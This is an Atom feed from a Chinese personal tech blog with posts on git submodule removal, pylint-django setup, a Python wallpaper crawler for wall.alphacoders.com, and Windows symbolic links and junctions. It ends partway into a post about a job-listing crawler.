<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  
  <subtitle>web安全与二进制路上挣扎前行的自留地</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2019-05-23T06:42:08.039Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>git彻底删除或变更子模块</title>
    <link href="http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html"/>
    <id>http://hacktech.cn/2019/05/23/git-rm-or-change-submodule.html</id>
    <published>2019-05-23T06:30:00.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。</p><a id="more"></a><ol><li>使原先子模块不被版本控制（先把子模块从版本控制系统移除）</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git rm --cached /path/to/files</span><br></pre></td></tr></table></figure><ol start="2"><li>删除子模块目录</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf /path/to/files</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 .gitmodules，移除这个 submodule</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-[submodule &quot;themes/next&quot;]</span><br><span class="line">-path = themes/next</span><br><span class="line">-url = https://github.com/theme-next/hexo-theme-next.git</span><br></pre></td></tr></table></figure><ol start="3"><li>修改 <code>.git/config</code> 内容，把需要删除的 submodule 配置项删除</li><li>修改 <code>.git/modules</code> 文件夹内容，把你想要删除的子模块目录删除（这项十分重要，或者你知道怎么修改也可以修改，不然导致的后果就是你改过来的同名子模块依然跟踪着之前的分支，git pull 也没法拉取你在 .gitmosules 中新定义的上游地址）</li><li>后面再按照普通的方法添加子模块即可</li></ol><p>一些子模块的操作可以参见<a href="https://blog.chh.tw/posts/git-submodule/" target="_blank" rel="noopener">Git Submodule 用法筆記</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;今天遇到一个很怪的问题，我想把我的一个子模块切换到另一个上游，我按照网上的方法删除子模块然后新建后，这个子模块依旧跟踪着我先前的上游。自己摸索了一下，可能方法比较傻，不过是可行的，希望能给大家一些帮助。&lt;/p&gt;
    
    </summary>
    
      <category term="git" scheme="http://hacktech.cn/categories/git/"/>
    
    
      <category term="git" scheme="http://hacktech.cn/tags/git/"/>
    
  </entry>
  
  <entry>
    <title>vscode打开django项目pylint提示has not &quot;object&quot; member</title>
    <link href="http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html"/>
    <id>http://hacktech.cn/2019/04/28/vscode-django-pylint-error.html</id>
    <published>2019-04-27T21:41:57.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。</p><a id="more"></a><p>解决方案：</p><ol><li>安装 pylint-django</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U pylint-django</span><br></pre></td></tr></table></figure><ol start="2"><li>启用 pylint-django</li></ol><p>打开项目下自动生成的 .vscode 文件夹下的 setting.json 文件，添加下面的配置项。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;python.linting.pylintArgs&quot;: [</span><br><span class="line">        &quot;--load-plugins=pylint_django&quot;</span><br><span class="line">    ]</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;vscode 打开 django 项目提示 has not “object” member 是因为 Django 动态地将属性添加到所有模型类中，所以 ide 无法解析。&lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>从客户端取到浏览器返回的oauth凭证</title>
    <link href="http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html"/>
    <id>http://hacktech.cn/2019/04/26/get-auth-and-back-to-client.html</id>
    <published>2019-04-26T02:14:33.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>这个随便记录一下，也是朋友问我的一个问题。</p><p>在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。</p><a id="more"></a><p>想到以前用过的rclone也是用的这样的方式，去看了下相关部分源码。</p><p>解决方案是本地搭建一个 webserver 用来获取凭证，然后客户端就能拿到了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这个随便记录一下，也是朋友问我的一个问题。&lt;/p&gt;
&lt;p&gt;在网上找了下，没找到相关的，用英文也搜索了一下，可能我的关键词没找对，找了一会没找到。&lt;/p&gt;
    
    </summary>
    
      <category term="问题解决" scheme="http://hacktech.cn/categories/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
    
      <category term="问题解决" scheme="http://hacktech.cn/tags/%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/"/>
    
  </entry>
  
  <entry>
    <title>打造一个壁纸爬虫来爬你的老婆</title>
    <link href="http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html"/>
    <id>http://hacktech.cn/2019/03/13/wall-alphacoders-com-crawler.html</id>
    <published>2019-03-12T23:07:57.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>好久没写东西了，随便水一篇文，也是比较简单的东西</p><a id="more"></a><p>可能每个喜欢二次元的人都有自己的老婆或者老公吧，之前在朋友那里看到了一个壁纸网站<a href="https://wall.alphacoders.com" target="_blank" rel="noopener">wall.alphacoders.com</a>，要是我想要亚丝娜的壁纸，只需要搜索她的英文名<code>Asuna</code>即可看到一千多张有关亚丝娜的壁纸。壁纸收集爱好者肯定就和我一样想把它们给下载到自己的电脑上幻灯片当作壁纸了，当然手工下载是不可能的，必须写下爬虫，分析下壁纸下载流程。</p><h2 id="请求分析"><a href="#请求分析" class="headerlink" title="请求分析"></a>请求分析</h2><p>首先我们<code>F12</code>打开开发者工具，在一张图上找到下载</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dqnaw51j20ac077777.jpg" alt=""></p><p>我们在开发者工具里面取元素，并没有看到下载链接，说明下载链接并没有包含在原始html中，但是点击是可以下载的，并且可以看到整个页面并没有进行刷新，判断是一个ajax请求，直接点进<code>XHR</code>，然后再次点击下载链接可以看到请求。</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dw0idvpj212a0lwn62.jpg" alt=""></p><p>可以看到这个请求返回了一个链接，我们直接访问链接，发现是可以下载的，说明这就是下载链接了，那么这个链接是怎么来的呢？</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11dy25rizj20o30d5gme.jpg" alt=""></p><p>我们看看请求，这个post请求里面有一些参数，我们先不去考虑这些参数怎么来的，我们先模拟一下请求看看请求Header里面有没有什么东西是必须的，这里直接上<code>postman</code>或者<code>curl</code>都可以，如果你的机器上面安装了<code>curl</code>我推荐用这个，因为<code>Chrome</code>开发者工具，直接可以在请求上右键<code>Copy as cURL</code>，直接可以帮你复制出curl命令，我这里复制出来是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; -H &quot;Pragma: no-cache&quot; -H &quot;Origin: https://wall.alphacoders.com&quot; -H &quot;Accept-Encoding: gzip, deflate, br&quot; -H &quot;Accept-Language: zh-CN,zh;q=0.9&quot; -H &quot;User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36&quot; -H &quot;Content-Type: application/x-www-form-urlencoded; charset=UTF-8&quot; -H &quot;Accept: */*&quot; -H &quot;Cache-Control: no-cache&quot; -H &quot;X-Requested-With: XMLHttpRequest&quot; -H &quot;Cookie: __cfduid=d7ec945393d1b5ef3c28d4c9d12ef9fb11552315444; cookieconsent_status=allow; wa_session=1eogv8ehgn3itq5g4g8hfsducpkm9lbu46q893vrkhph3ued4rm89gvk7ck4fdg9k73cmrcdesoqj4crm1575vj3lfid9e67fpis661&quot; -H &quot;Connection: keep-alive&quot; -H &quot;Referer: https://wall.alphacoders.com/search.php?search=Asuna&quot; --data &quot;wallpaper_id=533007^&amp;type=png^&amp;server=images8^&amp;user_id=79150&quot; --compressed</span><br></pre></td></tr></table></figure><p>我们先去掉不必要的东西 <code>curl &quot;https://wall.alphacoders.com/get_download_link.php&quot; --data &quot;wallpaper_id=533007&amp;type=png&amp;server=images8&amp;user_id=79150&quot;</code> ，直接执行，发现可以获取到地址，所以现在要考虑的只有这些参数是怎么来的了，下面我同样放一张postman的图，可以看到是同样的可以获取到下载链接</p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e4cniksj20hq04lwek.jpg" alt=""><br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11e7mv54sj20tx0cvgm5.jpg" alt=""></p><p>这些参数我们从两方面考虑，一是用js算出来的，一个就是在html中存在的。</p><p>我们首先在html里找找看有没有。</p><p>通过关键字搜索页面html，我们可以找到每一张图都有一串类似于下面的属性 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data-id=&quot;533007&quot; data-type=&quot;png&quot; data-server=&quot;images8&quot; data-user-id=&quot;79150&quot;</span><br></pre></td></tr></table></figure><p>和上面的post参数是一一对应的。</p><p>所以爬取思路就出来了。</p><p>访问一个页面，取到每一个图的特定属性，然后构造post请求得到下载地址，然后访问地址下载图片</p><p>那新问题是如果进行翻页并且判断是否到了最后一页。</p><p>我们可以发现页数是通过get的网址决定的，<code>https://wall.alphacoders.com/search.php?search=asuna&amp;page=10</code> ，更改<code>page</code>后面的值即可。</p><p>判断是否到了尾页，我们可以打开最后一页，然后查看一下html，我们可以看到<code>下一页</code>按钮的链接已经变成了 <code>&lt;a id=&#39;next_page&#39; href=&#39;#&#39;&gt;Next&amp;nbsp;&amp;#62;&lt;/a&gt;</code> ·，那我们就可以根据<code>href</code>的值是否为 <code>#</code> 来判断了。</p><h2 id="Python库的选择"><a href="#Python库的选择" class="headerlink" title="Python库的选择"></a>Python库的选择</h2><p>唯一用到的第三方库就是 <code>Requests</code> ，以前解析html的Dom树喜欢用<code>BeautifulSoup</code>，但是后来发现解析速度上确实和re有很大差距，并且当html有很特殊的字符时会又是莫名出错，故工程量不大的情况下，我现在还是优选正则。</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">proxies = &#123; <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:1080"</span>, <span class="string">"https"</span>: <span class="string">"http://127.0.0.1:1080"</span>, &#125;</span><br><span class="line"><span class="comment">#proxies = &#123;&#125;</span></span><br><span class="line">download_dir = <span class="string">'./pic/'</span></span><br><span class="line">downloaded_num = <span class="number">0</span></span><br><span class="line">total = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_pic</span><span class="params">(url, name, pic_type)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> download_dir</span><br><span class="line">    <span class="keyword">global</span> downloaded_num</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    <span class="comment"># if dir isn't exist, create a dir to download pic </span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(download_dir):</span><br><span class="line">        os.makedirs(download_dir)</span><br><span class="line">    <span class="comment"># download pic to special dir</span></span><br><span class="line">    r = requests.get(url, proxies=proxies)</span><br><span class="line">    downloaded_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'%s/%s.%s'</span>%(download_dir, name, pic_type), <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(r.content)</span><br><span class="line">    print(<span class="string">'[&#123;:5d&#125;/&#123;&#125;] &#123;&#125;.&#123;&#125; Done!'</span>.format(downloaded_num, total, name, pic_type))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_download_link</span><span class="params">(wallpaper_id, wallpaper_type, server, user_id)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    post_data = &#123;</span><br><span class="line">        <span class="string">'wallpaper_id'</span>: wallpaper_id,</span><br><span class="line">        <span class="string">'type'</span>: wallpaper_type,</span><br><span class="line">        <span class="string">'server'</span>: server,</span><br><span class="line">        <span class="string">'user_id'</span>: user_id,</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.post(<span class="string">'https://wall.alphacoders.com/get_download_link.php'</span>, data=post_data, proxies=proxies)</span><br><span class="line">    download_pic(r.text, wallpaper_id, wallpaper_type)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getwallpaper</span><span class="params">(keyword)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> proxies</span><br><span class="line">    <span class="keyword">global</span> total</span><br><span class="line">    p_nextpage = re.compile(<span class="string">r"&lt;a id='next_page' href=[\'\"](.+?)[\'\"]&gt;"</span>)</span><br><span class="line">    p_item = re.compile(<span class="string">r'data-id="(\d+?)" data-type="(\w+?)" data-server="(\w+?)" data-user-id="(\d+?)"'</span>)</span><br><span class="line">    page_num = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        r_page = requests.get(<span class="string">'https://wall.alphacoders.com/search.php?search=%s&amp;lang=Chinese&amp;page=%d'</span> % (keyword.lower(), page_num), proxies=proxies)</span><br><span class="line">        nextpage_link = p_nextpage.search(r_page.text)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't any search result, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link == <span class="keyword">None</span>:</span><br><span class="line">            print(<span class="string">"Sorry, we have no results for your search!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> page_num == <span class="number">1</span>:</span><br><span class="line">            total = int(re.search(<span class="string">r"&lt;h1 class='center title'&gt;\s+?(\d+)(.+?)\s+?&lt;/h1&gt;"</span>, r_page.text).group(<span class="number">1</span>))</span><br><span class="line">            print(<span class="string">"the %s wallpaper's total is %d"</span> % (keyword, total))</span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> p_item.findall(r_page.text):</span><br><span class="line">            wallpaper_id = item[<span class="number">0</span>]</span><br><span class="line">            wallpaper_type = item[<span class="number">1</span>]</span><br><span class="line">            server = item[<span class="number">2</span>]</span><br><span class="line">            user_id = item[<span class="number">3</span>]</span><br><span class="line">            get_download_link(wallpaper_id, wallpaper_type, server, user_id)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># if there isn't the next page's link, it will exit the loop</span></span><br><span class="line">        <span class="keyword">if</span> nextpage_link.group(<span class="number">1</span>) == <span class="string">'#'</span>:</span><br><span class="line">            print(<span class="string">"All wallpaper done!"</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        </span><br><span class="line">        page_num += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span> <span class="keyword">or</span> len(sys.argv) &gt; <span class="number">3</span>:</span><br><span class="line">        usage_text = <span class="string">"Usage:\n\tpython getwallpaper.py miku [miki_pic]\nFirst param: the name of script\nSecond param: the wallpaper's keyword which you want to search\nThird param: the dir's name where you want to download in, optional, default in ./pic"</span></span><br><span class="line">        print(usage_text)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">        download_dir = str(sys.argv[<span class="number">2</span>])</span><br><span class="line">        getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        getwallpaper(str(sys.argv[<span class="number">1</span>]))</span><br></pre></td></tr></table></figure><h2 id="多说的"><a href="#多说的" class="headerlink" title="多说的"></a>多说的</h2><p>里面我用了下本机的代理，懂的人自然懂，主要是因为直连下载确实有点慢。<br>另外自己懒，本来就是临时十多分钟写的一个脚本，就懒得加多线程了。</p><p>自己发了个无声视频，也就是对我讲解中的演示，需要的可以看这里<a href="https://www.bilibili.com/video/av46184510/" target="_blank" rel="noopener">https://www.bilibili.com/video/av46184510/</a></p><p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1g11eqgyz2cj20pt0gl0ts.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;好久没写东西了，随便水一篇文，也是比较简单的东西&lt;/p&gt;
    
    </summary>
    
      <category term="Python" scheme="http://hacktech.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://hacktech.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>windows中的软链接硬链接等</title>
    <link href="http://hacktech.cn/2018/09/21/windows-file-dir-link.html"/>
    <id>http://hacktech.cn/2018/09/21/windows-file-dir-link.html</id>
    <published>2018-09-20T23:55:11.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。</p><p>首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。</p><a id="more"></a><h2 id="使用PowerShell"><a href="#使用PowerShell" class="headerlink" title="使用PowerShell"></a>使用PowerShell</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType SymbolicLink -Path C:\\image -Target C:\\source.txt</span><br></pre></td></tr></table></figure><h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType HardLink -Path C:\\image.txt -Target C:\\source.txt</span><br></pre></td></tr></table></figure><h2 id="Junction"><a href="#Junction" class="headerlink" title="Junction"></a>Junction</h2><p>windows中文件与文件夹是完全不同的两种类型，创建文件夹链接不可以使用 <code>HardLink</code> ，但是可以使用 <code>Junction</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-Item</span> -ItemType Junction -Path C:\\test\_image -Target C:\\test\_source</span><br></pre></td></tr></table></figure><p>虽然powershell可以建立，但是命令还是很繁琐，cmd下有个工具mklink</p><h2 id="使用CMD"><a href="#使用CMD" class="headerlink" title="使用CMD"></a>使用CMD</h2><p>cmd下有个好用的工具mklink</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\\&gt;mklink</span><br><span class="line"></span><br><span class="line">创建符号链接。</span><br><span class="line">MKLINK \[\[/D\] | \[/H\] |\[/J\]\] Link Target</span><br><span class="line">    /D 创建目录符号链接。默认为文件符号链接。</span><br><span class="line">    /H 创建硬链接而非符号链接。</span><br><span class="line">    /J 创建目录链接。</span><br><span class="line">    Link 指定新的符号链接名称。</span><br><span class="line">    Target 指定新链接引用的路径（绝对或相对）。</span><br></pre></td></tr></table></figure><h2 id="软链接和硬链接的区别"><a href="#软链接和硬链接的区别" class="headerlink" title="软链接和硬链接的区别"></a>软链接和硬链接的区别</h2><p>其实这部分和linux中的是差不多的</p><p><strong>符号(软)链接</strong>（Symbolic link）</p><ul><li>执行命令 mklink link_name target_name</li><li>创建链接后的图标和快捷方式很像</li><li>在系统中不占用空间</li><li>在文件系统中不是一个单独的文件</li><li>在操作系统层解析（！？）</li><li>如果源文件被删除了，链接就没用了</li><li>移除源文件不会影响符号链接</li><li>移除链接文件也不会影响源文件</li></ul><p><strong>硬链接</strong>（Hard link）</p><ul><li>执行命令 mklink /H link_name target_name</li><li>在系统中占用的空间与源文件相同，但在系统中引用的是相同的对象（不是拷贝）</li><li>在操作系统层解析（！？）</li><li>图标和创建快捷方式的图标不同</li><li>移除源文件不会影响硬链接</li><li>移除硬链接不会影响源文件</li><li>如果源文件被删除，它的内容依然通过硬链接存在</li><li>硬链接文件的任何更改都会影响到源文件</li></ul><h2 id="快捷方式有何不同"><a href="#快捷方式有何不同" class="headerlink" title="快捷方式有何不同"></a>快捷方式有何不同</h2><p>首先不说快捷方式占空间， 软链接不占空间，还有我觉得很重要的区别是快捷方式带后缀<code>.lnk</code>，是个文件，无法通过路径重定向到目标地址，反正我不太推荐这个，除非是建立到桌面方便鼠标点击的用户。</p><h2 id="软链接和Junction的区别"><a href="#软链接和Junction的区别" class="headerlink" title="软链接和Junction的区别"></a>软链接和Junction的区别</h2><p>可能你会疑惑 <code>mklink</code> 命令参数 <code>/D</code> 和 <code>/J</code> 的区别。这里我直接贴一段我查到的东西：</p><ol><li>创建 /d 可以使用相对路径方式创建 /j  必须绝对路径方式创建 此区别意义不大，建议所有的mklink目录均用绝对路径创建</li><li>复制和剪切 复制：/d /j 均生成源目录的内容副本，变为一般文件夹 剪切/移动：/d 生成的目录，移动到其他地方，仍旧保持链接。对源目录无影响，/d生成的目录消失  /j 生成的目录，移动到其他地方，会产生一个新的副本文件夹，源文件夹内容全部移至新普通文件夹内，源文件夹清空，源文件夹仍旧存在，/j生成的目录也依旧存在                                              </li><li><p>软件打开 用filedialog打开，/d生成的目录，地址栏会跳到源目录位置。                             /J生成的目录，地址栏不会跳到源目录位置。 用FolderDialog打开，两者相同。 </p><p>整体来说，/D更像一个快捷方式。</p></li></ol><p>符号链接（Symlink，Softlink）是对文件或目录的引用，实际上符号链接本身是一个“记录着所引用文件或目录的绝对或相对路径”的特殊文件，通过符号链接的操作都会被重定向到目标文件或目录。  </p><p>交接点（Junction），也称为“再分析点”，是 NTFS 3.0 及以上文件系统（Windows 2000 及以上系统）的特性，它是链接本地目录（可跨卷）的访问点，通过交接点的操作都会被系统映射到实际的目录上。通过建立交接点，可以在保证一个目录实例（目录的一致性）的前提下，允许用户或程序从本地文件系统中的多个位置访问此目录。<br>对符号链接和快捷方式的“读、写、遍历”等操作都会被重定向到目标文件或目录；但对它们的“复制、删除、移动、配置 ACL”等操作只针对自身；符号链接不但可以应用于本地系统，还可以应用 UNC 路径。  </p><p>对交接点内文件和子目录的“建立、删除、修改”等操作都被映射到对应的目录中的文件和子目录上；<br>对交接点的“复制、粘贴、剪切、配置 ACL”，只会影响此交接点；<br>在同一卷内移动交接点，只会影响此交接点；但在不同卷间移动交接点，会将此交接点转换为正常目录，并且交接点对应目录下的所有内容都会被移动；<br>通过“资源浏览器（Explorer.exe）”和“命令行 del”等工具删除交接点时，会同时删除对应目录下的所有内容（但不会删除目录）；可通过“linkd.exe /d”安全的删除交接点；但在 vista 及以后的系统中，对交接点的删除会被正确的处理。</p><p>你可以自己建立这两个后，在同卷和在不同卷间复制移动粘贴看看区别，就暂时我了解到的来说的话，我个人建议是使用<code>/D</code>。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;学校嘛，有些时候还是得逆逆上网客户端啥的，并且学校的不少工作，这Windows的需求还是挺强的，之前Win10的体验并不是太好，不过时隔这么久，打算从7升级到10了，恰好系统也该换了。&lt;/p&gt;
&lt;p&gt;首先是命令行的关注，在家里使用了太久的marjaro，逐渐转为开发，以前对windows的命令行不关注也变为关注了，PowerShell安装了scoop，可以一键安装不少工具了，但是有一个痛点就是，以前对用户目录不关注，但是linux用久了反而觉得用户目录好用挖，我想在在命令行下切到我快捷方式指向的目录，但是是不行的，然后了解了一下这方面，就像是linux下的软链接硬链接一样。&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="http://hacktech.cn/categories/Windows/"/>
    
    
      <category term="Windows" scheme="http://hacktech.cn/tags/Windows/"/>
    
  </entry>
  
  <entry>
    <title>拉勾抓职位简单小爬虫</title>
    <link href="http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html"/>
    <id>http://hacktech.cn/2018/09/11/crawl-jos-on-lagou.html</id>
    <published>2018-09-10T20:12:38.000Z</published>
    <updated>2019-05-23T06:42:08.039Z</updated>
    
    <content type="html"><![CDATA[<p>花了十来分钟写了个这个小爬虫，目的就是想能够方便一点寻找职位，并且大四了，没有工作和实习很慌啊！</p><a id="more"></a><p>爬虫不具有扩展性，自己随手写的，改掉里面的 <code>keyword</code> 和 <code>region</code> 即可爬行所有的招聘，刚开始测试的是5s访问一次，不过还是会被ban，所以改成了20s一次，没有使用多线程和代理池，懒，够用就行了，结果会保存到一个csv文件里面，用excel打开即可。</p><p>直接上代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span 